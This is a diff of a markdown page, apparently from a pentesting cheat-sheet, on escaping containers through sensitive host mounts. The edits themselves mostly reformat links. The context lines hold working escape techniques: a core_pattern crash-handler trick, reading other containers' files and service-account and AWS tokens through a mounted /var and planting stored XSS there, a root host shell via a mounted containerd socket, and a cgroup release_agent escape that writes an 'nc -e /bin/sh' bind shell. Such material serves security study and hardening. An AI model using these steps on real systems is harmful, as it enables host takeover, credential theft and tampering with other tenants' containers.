@@ -1,9 +1,8 @@
 # Sensitive Mounts
 
-
 The exposure of `/proc`, `/sys`, and `/var` without proper namespace isolation introduces significant security risks, including attack surface enlargement and information disclosure. These directories contain sensitive files that, if misconfigured or accessed by an unauthorized user, can lead to container escape, host modification, or provide information aiding further attacks. For instance, incorrectly mounting `-v /proc:/host/proc` can bypass AppArmor protection due to its path-based nature, leaving `/host/proc` unprotected.
 
-**You can find further details of each potential vuln in** [[https://0xn3va.gitbook.io/cheat-sheets/container/escaping/sensitive-mounts|**https://0xn3va.gitbook.io/cheat-sheets/container/escaping/sensitive-mounts**]]**.**
+**You can find further details of each potential vuln in** [**https://0xn3va.gitbook.io/cheat-sheets/container/escaping/sensitive-mounts**](https://0xn3va.gitbook.io/cheat-sheets/container/escaping/sensitive-mounts)**.**
 
 ## procfs Vulnerabilities
 
@@ -13,7 +12,7 @@ This directory permits access to modify kernel variables, usually via `sysctl(2)
 
 #### **`/proc/sys/kernel/core_pattern`**
 
-- Described in [[https://man7.org/linux/man-pages/man5/core.5.html|core(5)]].
+- Described in [core(5)](https://man7.org/linux/man-pages/man5/core.5.html).
 - If you can write inside this file it's possible to write a pipe `|` followed by the path to a program or script that will be exuted after a crash happens.
 -  An attacker can find the path inside the host to his container executing `mount` and write the path to a binary inside his container file system. Then, crash a program to make the kernel execute the binary outside of the container.
 
@@ -25,8 +24,8 @@ cd /proc/sys/kernel
 echo "|$overlay/shell.sh" > core_pattern # Set custom handler
 sleep 5 && ./crash & # Trigger handler
 ```
-```
-Check [[https://pwning.systems/posts/escaping-containers-for-fun/|this post]] for more information.
+
+Check [this post](https://pwning.systems/posts/escaping-containers-for-fun/) for more information.
 
 Example program taht crashes:
 
@@ -39,10 +38,10 @@ int main(void) {
 	return 0;
 }
 ```
-```
+
 #### **`/proc/sys/kernel/modprobe`**
 
-- Detailed in [[https://man7.org/linux/man-pages/man5/proc.5.html|proc(5)]].
+- Detailed in [proc(5)](https://man7.org/linux/man-pages/man5/proc.5.html).
 - Contains the path to the kernel module loader, invoked for loading kernel modules.
 - **Checking Access Example**:
 
@@ -52,12 +51,12 @@ int main(void) {
 
 #### **`/proc/sys/vm/panic_on_oom`**
 
-- Referenced in [[https://man7.org/linux/man-pages/man5/proc.5.html|proc(5)]].
+- Referenced in [proc(5)](https://man7.org/linux/man-pages/man5/proc.5.html).
 - A global flag that controls whether the kernel panics or invokes the OOM killer when an OOM condition occurs.
 
 #### **`/proc/sys/fs`**
 
-- As per [[https://man7.org/linux/man-pages/man5/proc.5.html|proc(5)]], contains options and information about the file system.
+- As per [proc(5)](https://man7.org/linux/man-pages/man5/proc.5.html), contains options and information about the file system.
 - Write access can enable various denial-of-service attacks against the host.
 
 #### **`/proc/sys/fs/binfmt_misc`**
@@ -65,8 +64,8 @@ int main(void) {
 - Allows registering interpreters for non-native binary formats based on their magic number.
 - Can lead to privilege escalation or root shell access if `/proc/sys/fs/binfmt_misc/register` is writable.
 - Relevant exploit and explanation:
-  - [[https://github.com/toffan/binfmt_misc|Poor man's rootkit via binfmt_misc]]
-  - In-depth tutorial: [[https://www.youtube.com/watch?v=WBC7hhgMvQQ|Video link]]
+  - [Poor man's rootkit via binfmt_misc](https://github.com/toffan/binfmt_misc)
+  - In-depth tutorial: [Video link](https://www.youtube.com/watch?v=WBC7hhgMvQQ)
 
 ### Others in `/proc`
 
@@ -94,20 +93,20 @@ int main(void) {
 - Lists kernel exported symbols and their addresses.
 - Essential for kernel exploit development, especially for overcoming KASLR.
 - Address information is restricted with `kptr_restrict` set to `1` or `2`.
-- Details in [[https://man7.org/linux/man-pages/man5/proc.5.html|proc(5)]].
+- Details in [proc(5)](https://man7.org/linux/man-pages/man5/proc.5.html).
 
 #### **`/proc/[pid]/mem`**
 
 - Interfaces with the kernel memory device `/dev/mem`.
 - Historically vulnerable to privilege escalation attacks.
-- More on [[https://man7.org/linux/man-pages/man5/proc.5.html|proc(5)]].
+- More on [proc(5)](https://man7.org/linux/man-pages/man5/proc.5.html).
 
 #### **`/proc/kcore`**
 
 - Represents the system's physical memory in ELF core format.
 - Reading can leak host system and other containers' memory contents.
 - Large file size can lead to reading issues or software crashes.
-- Detailed usage in [[https://schlafwandler.github.io/posts/dumping-/proc/kcore/|Dumping /proc/kcore in 2019]].
+- Detailed usage in [Dumping /proc/kcore in 2019](https://schlafwandler.github.io/posts/dumping-/proc/kcore/).
 
 #### **`/proc/kmem`**
 
@@ -159,30 +158,30 @@ int main(void) {
   cat /output
   ```
 
-#### **`/sys/class/thermal**
+#### **`/sys/class/thermal`**
 
 - Controls temperature settings, potentially causing DoS attacks or physical damage.
 
-#### **`/sys/kernel/vmcoreinfo**
+#### **`/sys/kernel/vmcoreinfo`**
 
 - Leaks kernel addresses, potentially compromising KASLR.
 
-#### **`/sys/kernel/security**
+#### **`/sys/kernel/security`**
 
-- Houses `securityfs interface, allowing configuration of Linux Security Modules like AppArmor.
+- Houses `securityfs` interface, allowing configuration of Linux Security Modules like AppArmor.
 - Access might enable a container to disable its MAC system.
 
-#### **`/sys/firmware/efi/vars` and `/sys/firmware/efi/efivars**
+#### **`/sys/firmware/efi/vars` and `/sys/firmware/efi/efivars`**
 
 - Exposes interfaces for interacting with EFI variables in NVRAM.
 - Misconfiguration or exploitation can lead to bricked laptops or unbootable host machines.
 
-#### **`/sys/kernel/debug**
+#### **`/sys/kernel/debug`**
 
-- `debugfs offers a "no rules" debugging interface to the kernel.
+- `debugfs` offers a "no rules" debugging interface to the kernel.
 - History of security issues due to its unrestricted nature.
 
-### `/var Vulnerabilities
+### `/var` Vulnerabilities
 
 The host's **/var** folder contains container runtime sockets and the containers' filesystems.
 If this folder is mounted inside a container, that container will get read-write access to other containers' file systems
@@ -214,7 +213,7 @@ spec:
       hostPath:
         path: /var
 ```
-```
+
 Inside the **pod-mounts-var-folder** container:
 
 ```bash
@@ -237,10 +236,10 @@ REFRESH_TOKEN_SECRET=14<SNIP>ea
 / # echo '<!DOCTYPE html>' > /host-var/lib/containerd/io.containerd.snapshotter.v1.overlayfs/snapshots/140/fs/usr/sh
 are/nginx/html/index2.html
 ```
-```
+
 The XSS was achieved:
 
-![[/images/stored-xss-via-mounted-var-folder.png|Stored XSS via mounted /var folder]]
+![Stored XSS via mounted /var folder](/images/stored-xss-via-mounted-var-folder.png)
 
 Note that the container DOES NOT require a restart or anything. Any changes made via the mounted **/var** folder will be applied instantly.
 
@@ -259,7 +258,7 @@ which allows the container to gain unauthorized access to K8s or cloud:
 /host-var/lib/kubelet/pods/01c671a5-aaeb-4e0b-adcd-1cacd2e418ac/volumes/kubernetes.io~projected/aws-iam-token/..2025_01_22_03_45_56.2328221474/token
 /host-var/lib/kubelet/pods/5fb6bd26-a6aa-40cc-abf7-ecbf18dde1f6/volumes/kubernetes.io~projected/kube-api-access-fm2t6/..2025_01_22_12_25_25.3018586444/token
 ```
-```
+
 #### Docker
 
 The exploitation in Docker (or in Docker Compose deployments) is exactly the same, except that usually
@@ -270,7 +269,7 @@ $ docker info | grep -i 'docker root\|storage driver'
  Storage Driver: overlay2
  Docker Root Dir: /var/lib/docker
 ```
-```
+
 So the filesystems are under `/var/lib/docker/overlay2/`:
 
 ```bash
@@ -282,11 +281,12 @@ drwx--x---  4 root root  4096 Jan  9 21:23 049e02afb3f8dec80cb229719d9484aead269
 drwx--x---  4 root root  4096 Jan  9 21:22 062f14e5adbedce75cea699828e22657c8044cd22b68ff1bb152f1a3c8a377f2
 <SNIP>
 ```
-```
+
 #### Note
 
 The actual paths may differ in different setups, which is why your best bet is to use the **find** command to
 locate the other containers' filesystems and SA / web identity tokens
+
 
 
 ### Other Sensitive Host Sockets and Directories (2023-2025)
@@ -301,7 +301,7 @@ Mounting certain host Unix sockets or writable pseudo-filesystems is equivalent 
 /var/run/kubelet.sock               # Kubelet API on Kubernetes nodes
 /run/firecracker-containerd.sock    # Kata / Firecracker
 ```
-```
+
 Attack example abusing a mounted **containerd** socket:
 
 ```bash
@@ -311,7 +311,7 @@ ctr --address /host/run/containerd.sock run --tty --privileged --mount \
   type=bind,src=/,dst=/host,options=rbind:rw docker.io/library/busybox:latest host /bin/sh
 chroot /host /bin/bash   # full root shell on the host
 ```
-```
+
 A similar technique works with **crictl**, **podman** or the **kubelet** API once their respective sockets are exposed.
 
 Writable **cgroup v1** mounts are also dangerous. If `/sys/fs/cgroup` is bind-mounted **rw** and the host kernel is vulnerable to **CVE-2022-0492**, an attacker can set a malicious `release_agent` and execute arbitrary code in the *initial* namespace:
@@ -325,7 +325,7 @@ echo '/tmp/pwn' > /sys/fs/cgroup/release_agent   # requires CVE-2022-0492
 echo -e '#!/bin/sh\nnc -lp 4444 -e /bin/sh' > /tmp/pwn && chmod +x /tmp/pwn
 sh -c "echo 0 > /tmp/x/cgroup.procs"  # triggers the empty-cgroup event
 ```
-```
+
 When the last process leaves the cgroup, `/tmp/pwn` runs **as root on the host**. Patched kernels (>5.8 with commit `32a0db39f30d`) validate the writer’s capabilities and block this abuse.  
 
 ### Mount-Related Escape CVEs (2023-2025)
@@ -357,13 +357,11 @@ When the last process leaves the cgroup, `/tmp/pwn` runs **as root on the host**
 
 ### References
 
-- [[https://github.com/opencontainers/runc/security/advisories/GHSA-xr7r-f8xq-vfvv|runc CVE-2024-21626 advisory]]
-- [[https://unit42.paloaltonetworks.com/cve-2022-0492-cgroups/|Unit 42 analysis of CVE-2022-0492]]
-- [[https://0xn3va.gitbook.io/cheat-sheets/container/escaping/sensitive-mounts|https://0xn3va.gitbook.io/cheat-sheets/container/escaping/sensitive-mounts]]
-- [[https://research.nccgroup.com/wp-content/uploads/2020/07/ncc_group_understanding_hardening_linux_containers-1-1.pdf|Understanding and Hardening Linux Containers]]
-- [[https://www.nccgroup.com/globalassets/our-research/us/whitepapers/2016/june/container_whitepaper.pdf|Abusing Privileged and Unprivileged Linux Containers]]
-- [[https://github.com/containers/buildah/security/advisories/GHSA-pmf3-c36m-g5cf|Buildah CVE-2024-1753 advisory]]
-- [[https://github.com/containerd/containerd/security/advisories/GHSA-265r-hfxg-fhmg|containerd CVE-2024-40635 advisory]]
-
-
+- [runc CVE-2024-21626 advisory](https://github.com/opencontainers/runc/security/advisories/GHSA-xr7r-f8xq-vfvv)
+- [Unit 42 analysis of CVE-2022-0492](https://unit42.paloaltonetworks.com/cve-2022-0492-cgroups/)
+- [https://0xn3va.gitbook.io/cheat-sheets/container/escaping/sensitive-mounts](https://0xn3va.gitbook.io/cheat-sheets/container/escaping/sensitive-mounts)
+- [Understanding and Hardening Linux Containers](https://research.nccgroup.com/wp-content/uploads/2020/07/ncc_group_understanding_hardening_linux_containers-1-1.pdf)
+- [Abusing Privileged and Unprivileged Linux Containers](https://www.nccgroup.com/globalassets/our-research/us/whitepapers/2016/june/container_whitepaper.pdf)
+- [Buildah CVE-2024-1753 advisory](https://github.com/containers/buildah/security/advisories/GHSA-pmf3-c36m-g5cf)
+- [containerd CVE-2024-40635 advisory](https://github.com/containerd/containerd/security/advisories/GHSA-265r-hfxg-fhmg)
 
